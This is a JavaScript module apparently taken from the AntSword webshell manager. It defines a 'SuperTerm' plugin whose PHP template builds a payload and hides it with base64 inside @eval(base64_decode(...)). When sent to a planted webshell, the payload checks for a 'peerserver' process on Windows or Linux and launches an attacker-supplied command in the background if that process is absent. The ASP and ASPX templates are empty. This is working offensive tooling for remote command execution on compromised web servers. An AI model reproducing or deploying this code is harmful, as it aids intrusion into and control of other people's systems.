/**
 * 核心模块
 */

class SuperTerm {
  constructor(opt, argv) {
    return new Promise((res, rej) => {
      // 初始化核心模块
      let core = new antSword['core'][opt['type']](opt);
      // 请求数据
      core.request({
        _: this.template[opt['type']](argv.cmd)
      }).then(res)
      .catch((err)=>{
        rej(err);
      });
    });
  }

  get template() {
    return {
      php: (cmd) => {
        var funcode = `function checkserver(){if(substr(php_uname(),0,7)=="Windows"){$cmd = "tasklist|findstr peerserver";}else{$cmd="ps -A|grep peerserver|grep -v grep";}@exec($cmd, $info);if($info){return 1;}return 0;};function execbg($cmd){putenv("TERM=xterm-256color");if(substr(php_uname(),0,7)=="Windows"){pclose(popen("start /B ". $cmd, "r"));}else{exec($cmd." > /dev/null &");}};if(checkserver()==1){echo "1";}else{@execbg("${cmd}");sleep(3);if(checkserver()==1){echo "1";}else{echo "0";}}`
        var data = new Buffer(funcode).toString('base64');
        return `@eval(base64_decode("${data}"));`
      },
      asp: (url, tasks) => ``,
      aspx: (url, tasks) => ``
    }
  }

}

module.exports = SuperTerm;
